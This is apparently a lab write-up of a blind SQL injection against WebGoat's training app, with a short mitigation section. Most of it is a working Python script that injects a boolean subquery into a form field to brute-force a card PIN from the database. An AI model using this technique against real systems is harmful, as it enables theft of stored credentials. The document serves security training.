## Vulnerability:

blind sqli

## Exploitation:

Here's my script that exploits (finds requested pin field: 2364 in pins table) this issue:

```
#!/usr/bin/python3

# (http://docs.python-requests.org/en/latest/)
from requests import post
import sys

proxies = {
    "http": "http://127.0.0.1:8081",
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://webgoat.hacking-lab.com',
    'Referer': 'http://webgoat.hacking-lab.com/attack?Screen=4&menu=1100'
}

cookie = ''

for i in range(1111,9999):
    print(i)
    payload = "101 AND (SELECT pin FROM pins WHERE cc_number=1111222233334444)="+str(i)
    data = {'account_number': payload, 'SUBMIT': 'Go'}
    if cookie == '':
        r = post("http://webgoat.hacking-lab.com/attack?Screen=4&menu=1100", headers=headers, proxies=proxies, data=data)
        cookie = dict(JSESSIONID=r.cookies['JSESSIONID'])
    else:
        r = post("http://webgoat.hacking-lab.com/attack?Screen=4&menu=1100", headers=headers, proxies=proxies, cookies=cookie, data=data)

    if 'Account number is valid' in r.text:
        print('pin: ' + str(i))
        break
```

## Mitigation:
1) validate input data

2) follow guidelines from https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
